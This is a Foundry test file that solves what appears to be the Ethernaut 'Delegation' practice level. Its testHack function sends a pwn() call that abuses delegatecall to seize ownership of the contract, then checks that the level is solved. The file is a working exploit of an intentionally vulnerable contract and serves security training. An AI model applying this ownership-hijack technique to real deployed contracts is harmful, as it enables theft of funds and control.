pragma solidity ^0.8.0;

import 'forge-std/Test.sol';
import 'levels/DelegationFactory.sol';
import 'levels/Delegation.sol';
import 'utils/TestUtils.sol';

contract DelegationTest is Test {
  address player;
  Utils utils;
  DelegationFactory delegationFactory;
  address payable delegationAddress;

  function setUp() public {
    utils = new Utils();
    player = utils.createUsers(1)[0];
    delegationFactory = new DelegationFactory();
    delegationAddress = payable(delegationFactory.createInstance(player));
  }

  function testHack() public {
    vm.prank(player);
    delegationAddress.call(abi.encodeWithSignature('pwn()'));
    assertTrue(delegationFactory.validateInstance(delegationAddress, player), 'Level not solved');
  }
}
